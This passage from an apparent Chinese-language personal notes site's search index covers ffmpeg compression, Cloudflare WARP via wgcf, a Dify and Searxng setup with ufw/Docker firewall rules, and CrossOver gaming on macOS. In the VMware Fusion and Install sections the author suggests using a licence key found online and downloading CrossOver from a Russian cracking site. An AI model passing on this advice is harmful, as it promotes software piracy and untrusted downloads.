\u63d0\u5347\u538b\u7f29\u901f\u5ea6\u3002</p>"},{"location":"tools/ffmpeg/#automater","title":"Automater","text":"<p>\u5efa\u7acb\u4f18\u5316\u5de5\u4f5c\u6d41\uff0c\u591a\u6587\u4ef6\u9009\u4e2d\u5373\u53ef\u538b\u7f29\uff0c\u8be5\u65b9\u6848\u53ef\u7528\u4e8e\u6240\u6709\u811a\u672c:</p> <pre><code>#!/bin/zsh\nfor f in \"$@\"\ndo\n  /opt/homebrew/bin/ffmpeg -i \"$f\" -c:v libx264 -crf 30 -r 24 -movflags faststart -c:a aac -b:a 128k -preset superfast \"${f%.*}_compressed.mp4\"\ndone\n</code></pre>"},{"location":"tools/ffmpeg/#macos-m","title":"MacOS M \u7cfb\u5217\u82af\u7247\u63a8\u7406\u52a0\u901f","text":"<ul> <li>H.264</li> </ul> <pre><code>-c:v h264_videotoolbox\n</code></pre> <ul> <li>HEVC/H.265 </li> </ul> <pre><code>-c:v hevc_videotoolbox\n</code></pre> <pre><code>ffmpeg -i input.mov -c:v h264_videotoolbox output.mp4\n</code></pre> <p>\u5173\u4e8e\u5176\u89e3\u7801\u5668\u5176\u4ed6\u9009\u9879\uff1a</p> <pre><code>ffmpeg -h encoder=h264_videotoolbox \nffmpeg -h encoder=hevc_videotoolbox\n</code></pre> <p>\u7f3a\u70b9\u4e3a\u8be5\u7c7b\u89e3\u7801\u5668\u5e76\u4e0d\u652f\u6301 crf \u9009\u9879\uff0c\u53ea\u80fd\u4f7f\u7528 <code>-b:v</code> \u53bb\u8bbe\u7f6e\u7801\u7387\uff1a<code>-b:v 6000k.</code></p>"},{"location":"tools/gfw/","title":"The Great Firewall","text":""},{"location":"tools/gfw/#cloudflare-warp","title":"Cloudflare WARP<sup>1</sup>","text":"<p><code>wgcf.exe</code> \u4e0b\u8f7d\u5b89\u88c5\uff1awgcf</p> <pre><code>.\\wgcf.exe register\n.\\wgcf.exe generate\n</code></pre> <p>\u6700\u540e\u628a\u6240\u6709\u4ee3\u7406\u670d\u52a1\u5668\u5173\u95ed\uff0c\u8fdb\u884c IP \u6d4b\u901f\u8c03\u4f18</p> <p>CloudflareWarpSpeedTest</p> <p>\u6267\u884c\u76f8\u5173\u811a\u672c\u67e5\u770b\u751f\u6210\u7684\u6570\u636e\uff0c\u66ff\u6362 Endpoint \u5173\u952e\u8bcd</p> <pre><code>qrencode -t ansiutf8 &lt; wgcf-profile.conf\n</code></pre> <ol> <li> <p>\u5728 WireGuard \u5ba2\u6237\u7aef\u4e0a\u4f7f\u7528 CloudFlare WARP \u8282\u70b9 \u21a9</p> </li> </ol>"},{"location":"tools/searxng/","title":"Dify + Searxng Plugin","text":"<p>Dify \u4e0a\u914d\u5408 Searxng + Webscraper \u53ef\u5feb\u901f\u5b9e\u73b0\u96f6\u6210\u672c\u81ea\u5efa\u5e76\u4e14\u65e0\u901f\u7387\u9650\u5236\u7684\u77e5\u8bc6\u641c\u7d22\u5668\u3002</p>"},{"location":"tools/searxng/#quick-start","title":"Quick Start","text":"<ul> <li>\u670d\u52a1\u5668\u642d\u5efa Dify \u540e\u4f7f\u7528 Zerotier \u8fde\u63a5\u5176\u5c40\u57df\u7f51\u5728 Mac \u4e0a\u8fdb\u884c\u8bbf\u95ee</li> <li>Docker \u642d\u5efa Searxng \u670d\u52a1\u7aef\u540e\u5728 Dify \u5b89\u88c5\u5176 Plugin \u5e76\u914d\u7f6e</li> <li>\u7f51\u7edc\u914d\u7f6e\u4fee\u6539\u5b9e\u73b0 <code>ufw</code> \u7ba1\u63a7 Docker \u7aef\u53e3\u9632\u706b\u5899\u80fd\u529b</li> </ul>"},{"location":"tools/searxng/#docker-firewall","title":"Docker Firewall<sup>1</sup>","text":"<pre><code>nano /etc/ufw/after.rules\n</code></pre> <pre><code># BEGIN UFW AND DOCKER\n*filter\n:ufw-user-forward - [0:0]\n:DOCKER-USER - [0:0]\n-A DOCKER-USER -j RETURN -s 10.0.0.0/8\n-A DOCKER-USER -j RETURN -s 172.16.0.0/12\n-A DOCKER-USER -j RETURN -s 192.168.0.0/16\n\n-A DOCKER-USER -j ufw-user-forward\n\n-A DOCKER-USER -j DROP -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -d 192.168.0.0/16\n-A DOCKER-USER -j DROP -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -d 10.0.0.0/8\n-A DOCKER-USER -j DROP -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -d 172.16.0.0/12\n-A DOCKER-USER -j DROP -p udp -m udp --dport 0:32767 -d 192.168.0.0/16\n-A DOCKER-USER -j DROP -p udp -m udp --dport 0:32767 -d 10.0.0.0/8\n-A DOCKER-USER -j DROP -p udp -m udp --dport 0:32767 -d 172.16.0.0/12\n\n-A DOCKER-USER -j RETURN\nCOMMIT\n# END UFW AND DOCKER\n</code></pre> <pre><code>sudo systemctl restart ufw\n</code></pre>"},{"location":"tools/searxng/#searxng-setting","title":"Searxng Setting","text":"<pre><code>nano \"${PWD}/searxng/settings.yml\"\n</code></pre> <p>\u8bb0\u4e0b\u670d\u52a1\u5668\u5728 ZeroTier \u5c40\u57df\u7f51\u4e2d\u7684 IP \u5730\u5740\uff0c\u6211\u7684\u4e3a <code>192.168.191.170</code>\uff0c\u56e0\u6b64\u4e3a\u4e86\u5b9e\u73b0\u53ea\u6709\u5c40\u57df\u7f51\u4e2d\u8bbe\u5907\u53ef\u8fde\u63a5\u6b64\u670d\u52a1\uff1a</p> <pre><code>formats:\n  - html\n  - json\n</code></pre> <p>\u9996\u5148\u786e\u4fdd\u914d\u7f6e\u4e2d\u542b\u6709 <code>json</code> \u8bbe\u7f6e\uff0c\u63a5\u7740\u5728 <code>server</code> \u914d\u7f6e\u9009\u9879\u4e2d\u4e3a\u9632\u6b62\u88ab\u6df7\u6dc6\uff0c\u4e25\u683c\u6539\u4e3a ZeroTier \u5730\u5740</p> <pre><code>server:\n  port: 8081\n  bind_address: \"192.168.191.170\"\n  base_url: http://192.168.191.170:8081/\n  limiter: false\n  public_instance: false\n</code></pre> <p>\u4e0b\u9762\u4f1a\u6709\u4e00\u4e2a <code>secret_key</code> \u4e0d\u8981\u52a8</p>"},{"location":"tools/searxng/#run","title":"Run","text":"<pre><code>ufw allow 8081\nufw reload\n</code></pre> <pre><code>docker run \\\n  -d -p 8081:8080 \\\n  -v \"${PWD}/searxng:/etc/searxng\" \\\n  -e \"BASE_URL=http://192.168.191.170:8081/\" \\\n  -e \"INSTANCE_NAME=searxng\" \\\n  --restart always \\\n  searxng/searxng\n</code></pre> <p>\u7ed3\u675f\u540e\u8fde\u4e0a ZeroTier \u670d\u52a1\u540e\u5982\u80fd\u6b63\u5e38\u6253\u5f00\u76f4\u63a5\u524d\u5f80 Dify \u5b89\u88c5\u63d2\u4ef6\u586b\u5199 <code>BASE_URL</code> \u5373\u53ef\uff0c\u7ed3\u675f\u5b89\u88c5</p>"},{"location":"tools/searxng/#common-mistakes","title":"Common Mistakes","text":"<pre><code>tail -f /var/log/ufw.log\nufw status numbered\nsudo ufw allow from 172.19.0.7 to 192.168.191.170 port 8081\nufw delete num\n</code></pre> <p>\u524d\u671f\u6709\u79cd\u60f3\u6cd5\uff1a\u901a\u8fc7 <code>ufw</code> \u6765\u7cbe\u786e\u63a7\u5236\u8bbf\u95ee\uff0c\u4f46\u662f\u5176\u4f1a\u76f4\u63a5\u5bfc\u81f4 Dify \u4e2d\u5927\u6a21\u578b\u4f7f\u7528\u8d85\u65f6\uff0c\u56e0\u6b64\u5408\u7406\u505a\u6cd5\u4e3a\u5728\u914d\u7f6e\u4e2d\u5b9a\u4e49\u7cbe\u786e</p> <ol> <li> <p>What is the best practice of docker + ufw under Ubuntu  \u21a9</p> </li> </ol>"},{"location":"tools/wine/","title":"macOS Virtual Machine","text":"<p>\u5b59\u609f\u7a7a\uff0c\u65e9\u5c31\u6b7b\u4e86\uff01\u516b\u6212\uff0c\u4f60\u5fc3\u91cc\u660e\u767d\uff0c\u4f60\u90a3\u5e08\u5144\uff0c\u4ece\u6765\u6ca1\u90a3\u4e48\u5706\u6ee1\u3002</p>"},{"location":"tools/wine/#_1","title":"\u6267\u5ff5","text":"<p>\u4e0a\u5b66\u671f\u4fee\u4e86\u4e00\u95e8 Cybersecurity, \u7528\u5230\u4e86 UTM \u8fd0\u884c Kali Linux \u865a\u62df\u673a\uff0c\u56e0\u6b64\u89e6\u53d1\u4e86\u4e00\u4e9b\u88ab\u521b\u9020\u7684\u9700\u6c42\uff0c\u4e5f\u662f\u6267\u5ff5\u7684\u5f00\u59cb\u3002</p>"},{"location":"tools/wine/#vmware-fusion","title":"VMware Fusion","text":"<p>\u5176\u4f18\u70b9\u4e3a\u53ef\u4ee5\u5728\u7f51\u4e0a\u968f\u610f\u627e\u4e00\u4e2a Key \u7c98\u8d34\uff0c\u7136\u540e\u6b63\u7248\u4e1d\u6ed1\u66f4\u65b0\u6b63\u5e38\u4f7f\u7528\u3002\u7f3a\u70b9\u4e3a\u65e0\u6cd5\u50cf UTM \u4e00\u6837\u76f4\u63a5\u8fd0\u884c x86 \u7cfb\u7edf\uff0c\u9700\u8981\u4e13\u95e8\u5bfb\u627e ARM \u7248\u672c\u4e0b\u8f7d\u8fd0\u884c\u3002\u4f46 Windows 11 ARM \u7248\u5185\u7f6e ARM to x86 \u6307\u4ee4\u96c6\u8f6c\u8bd1\uff0c\u53ef\u4ee5\u4e1d\u6ed1\u8fd0\u884c\u6240\u6709\u865a\u62df\u673a\u91cc\u7684 x86 \u5e94\u7528\uff0c\u5927\u7ea6\u4f1a\u5360\u7528\u63a5\u8fd1 40 G \u7a7a\u95f4\uff0c\u53ef\u4ee5\u6d41\u7545\u8fd0\u884c\u690d\u7269\u5927\u6218\u50f5\u5c38\u6742\u4ea4\u7248\u548c\u5176\u4fee\u6539\u5668\u3002</p> <p>\u6b64\u65b9\u6848\u5728\u517c\u5bb9\u6027\u65b9\u9762\u6700\u4f73\uff0c\u4f46\u9700\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\u767b\u9646\u5fae\u8f6f\u8d26\u6237\uff0c\u6fc0\u6d3b\u7cfb\u7edf\u4f18\u5316\u8bbe\u7f6e\uff0c\u5e76\u9650\u5b9a\u865a\u62df\u673a\u914d\u7f6e\u5360\u7528\u5904\u7406\u5668\u548c\u5185\u5b58\u7b49\uff0c\u53ea\u9002\u5408\u4e00\u4e9b\u6027\u80fd\u5360\u7528\u8f83\u4f4e\u7684\u6e38\u620f\u548c\u8f6f\u4ef6\u8fd0\u884c\u3002\u5e76\u4e14\u6587\u4ef6\u914d\u7f6e\u4e00\u65e6\u9700\u8981\u66f4\u6539\uff0c\u4ece\u5916\u90e8\u62d6\u52a8\u8f83\u4e3a\u9ebb\u70e6\uff0c\u800c\u672c\u8eab\u65e5\u5e38\u5b66\u4e60\u6ca1\u6709 Windows \u7cfb\u7edf\u4f7f\u7528\u573a\u666f\uff0c\u800c\u5bb6\u4e2d\u6709\u4e00\u4e2a Ubuntu \u7cfb\u7edf\u7684\u5fae\u7535\u8111\u53ef\u4ee5\u6ee1\u8db3\u8ba1\u7b97\u673a\u8bfe\u7a0b\u9700\u8981\uff0c\u56e0\u6b64\u5220\u9664\u3002</p>"},{"location":"tools/wine/#crossover","title":"CrossOver","text":"<p>\u4ece Wine + Wineskin \u4ee5\u53ca\u514d\u8d39\u7684 Whisky \u5168\u90e8\u5c1d\u8bd5\u4e00\u904d\u540e\uff0c\u53d1\u73b0 CrossOver \u8fd9\u6837\u7684\u5546\u4e1a\u8f6f\u4ef6\u624d\u662f\u5bb9\u5668\u9886\u57df\u7684\u6700\u4f73\u89e3\u51b3\u65b9\u6848\uff0cWhisky \u7684 Wine \u7248\u672c\u8fc7\u4f4e\u5e76\u4e14\u6ca1\u6709\u90e8\u5206\u517c\u5bb9\u9009\u9879\uff0cCrossOver \u4e0d\u4ec5\u4f1a\u4e0d\u65ad\u4fee\u590d\u4e3b\u6d41\u8f6f\u4ef6\u8fd0\u884c Bug \u8fd8\u4f1a\u4fdd\u6301\u5bb9\u5668\u6700\u65b0\u7248\u672c\u3002\u642d\u914d Game Porting Toolkit 2 \u80fd\u6b63\u5e38 Steam \u73a9\u6e38\u620f\u4ee5\u53ca\u8fd0\u884c\u90e8\u5206 3D \u79bb\u7ebf\u8f6f\u4ef6\uff0c\u514d\u9664\u7e41\u7410\u7684\u914d\u7f6e\u6307\u4ee4\u5e76\u4e14\u63d0\u4f9b\u9000\u51fa\u91cd\u542f\u7b49\u5feb\u6377\u6309\u94ae\u3002</p>"},{"location":"tools/wine/#install","title":"Install","text":"<p>\u4ece\u4fc4\u7f57\u65af\u7834\u89e3\u7f51\u7ad9\u4e0b\u8f7d\u5b89\u88c5\u6700\u65b0 CrossOver \u5b89\u88c5\u597d\u540e\u65b0\u5efa Win10 64-bi t Bottle \u5e76\u5f00\u542f D3DMetal \u548c MSync \u9009\u9879:</p> <p>D3DMetal \u662f\u4e00\u4e2a\u56fe\u5f62 API \u7ffb\u8bd1\u5c42\uff0c\u4e3b\u8981\u7528\u4e8e\u5c06 DirectX 11 \u548c DirectX 12 \u6e38\u620f\u79fb\u690d\u5230 MacOS \u7cfb\u7edf\u4e0a \u3002\u5f53\u542f\u7528 D3DMetal \u65f6\uff0c\u5b83\u4f1a\u66ff\u4ee3 DXVK \u6216 Wined3d \u9ed8\u8ba4\u8bbe\u7f6e\uff0c\u4ece\u800c\u63d0\u4f9b\u66f4\u597d\u7684\u6e38\u620f\u6027\u80fd\u3002</p> <p>ESync\uff0c\u5373\u4e8b\u4ef6\u540c\u6b65\uff08event synchronization\uff09\uff0c\u662f\u4e00\u4e2a\u7531 Wine \u63d0\u51fa\u7684\u8865\u4e01\u96c6\uff0c\u65e8\u5728\u6539\u5584 Windows \u5e94\u7528\u7a0b\u5e8f\u4e0e\u5e95\u5c42\u64cd\u4f5c\u7cfb\u7edf\u4e4b\u95f4\u4e8b\u4ef6\u7684\u540c\u6b65\u3002\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u5f00\u542f ESync \u540e\u6027\u80fd\u4f1a\u663e\u8457\u63d0\u5347 \u3002\u8fd9\u4e2a\u673a\u5236\u5728\u5904\u7406\u591a\u7ebf\u7a0b\u5e94\u7528\u65f6\u5c24\u4e3a\u91cd\u8981\uff0c\u53ef\u4ee5\u51cf\u5c11\u56e0\u7ebf\u7a0b\u8c03\u5ea6\u4e0d\u5f53\u5bfc\u81f4\u7684\u6027\u80fd\u635f\u5931\u2074\u3002</p> <p>MSYNC \u65e8\u5728\u8fdb\u4e00\u6b65\u63d0\u9ad8\u5728\u975e Windows \u7cfb\u7edf\u4e2d\u8fd0\u884c\u7684 Windows \u5e94\u7528\u7a0b\u5e8f\u7684\u6027\u80fd\u548c\u540c\u6b65\u3002\u4e0e ESync \u4e0d\u540c\u7684\u662f\uff0cMSYNC \u4e13\u6ce8\u4e8e\u6539\u8fdb\u591a\u4e2a\u7ebf\u7a0b\u95f4\u7684\u534f\u4f5c\uff0c\u80fd\u591f\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u663e\u8457\u63d0\u5347\u6e38\u620f\u4f53\u9a8c\u3002MSYNC \u5df2\u7ecf\u5f00\u59cb\u5f97\u5230\u652f\u6301\uff0c\u4f7f\u5f97 Mac \u7528\u6237\u4e5f\u80fd\u4eab\u53d7\u5230\u66f4\u7a33\u5b9a\u7684\u6027\u80fd\u6539\u5584\u3002</p> <p>\u5b9e\u6d4b\u540e\u53d1\u73b0 ESync \u5f00\u542f\u540e\u5b9e\u9645\u4f1a\u62d6\u6162 3D \u6e38\u620f\u8fd0\u884c\u901f\u5ea6\uff0c\u63a8\u8350\u6e38\u620f\u53ea\u5f00\u542f D3D + MSYNC \u9009\u9879</p> <p>\u90e8\u5206\u5e94\u7528\u4e2d\u6587\u5b89\u88c5\u542f\u52a8\u8fc7\u7a0b\u6587\u5b57\u4f1a\u4e71\u7801\uff0c\u70b9\u51fb Run With Options \u5728 Command-Line Options \u4e2d\u8bbe\u7f6e\u4ee5\u4e0b\u73af\u5883\u6307\u4ee4\u540e\u518d\u542f\u52a8\uff1a</p> <pre><code>set lang=zh_cn\n</code></pre>"},{"location":"tools/wine/#gtk-2","title":"GTK 2","text":"<p>\u7b80\u4ecb\u91cc\u5df2\u63d0\u4f9b\u4e86\u4e0b\u8f7d\u94fe\u63a5\uff0c\u5b9e\u6d4b\u9700\u4f7f\u7528 Safari \u624d\u80fd\u6b63\u5e38\u4e0b\u8f7d\uff0c\u6302\u8f7d\u540e\u4f1a\u770b\u5230 <code>Evaluation environment for Windows games 2.0.dmg</code> \u6587\u4ef6\uff0c\u6253\u5f00\u540e\u540c\u610f\u542f\u52a8\u4f1a\u81ea\u52a8\u6ce8\u5165\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\uff0c\u540c\u610f\u6253\u5f00\u540e\u4f1a\u770b\u5230\u4e00\u4e2a <code>Read Me.rtf</code> \u6587\u4ef6\uff0c\u6253\u5f00\u540e\u590d\u5236 CrossOver \u6807\u9898\u4e0b\u7684\u6307\u4ee4\u5728 Terminal \u4e2d\u7c98\u8d34\u4e00\u4ef6\u66ff\u6362 CrossOver \u4e2d\u7684\u517c\u5bb9\u5c42:</p> <pre><code>cd /Applications/CrossOver.app/Contents/SharedSupport/CrossOver/lib64/apple_gptk/external\nmv D3DMetal.framework D3DMetal.framework-old; mv libd3dshared.dylib libd3dshared.dylib-old\nditto /Volumes/Evaluation\\ environment\\ for\\ Windows\\ games\\ 2.0/redist/lib/external/ .\n</code></pre>"},{"location":"tools/wine/#others","title":"Others","text":"<p>Steam \u89d2\u6807\u5728\u5f3a\u5236\u9000\u51fa\u4e4b\u540e\u4f9d\u7136\u4f1a\u5728\u53f3\u4e0a\u89d2\u6b8b\u7559\uff0c\u56e0\u6b64\u6700\u597d\u624b\u52a8\u91cd\u542f\u5bb9\u5668\uff0c\u5c11\u6570\u60c5\u51b5\u4e0b\u4f7f\u7528\u5de6\u4e0a\u89d2\u82f9\u679c\u56fe\u6807\u5f3a\u5236\u9000\u51fa\u6216\u6267\u884c\uff1a</p> <pre><code>pkill -f wine\n</code></pre> <p>Steam \u6e38\u620f\u4e0b\u8f7d\u5b8c\u6bd5\u540e\u5c06 steamapps/common \u6587\u4ef6\u5939\u76f8\u5173\u6587\u4ef6\u4f5c\u786c\u76d8\u5907\u4efd</p>"}]}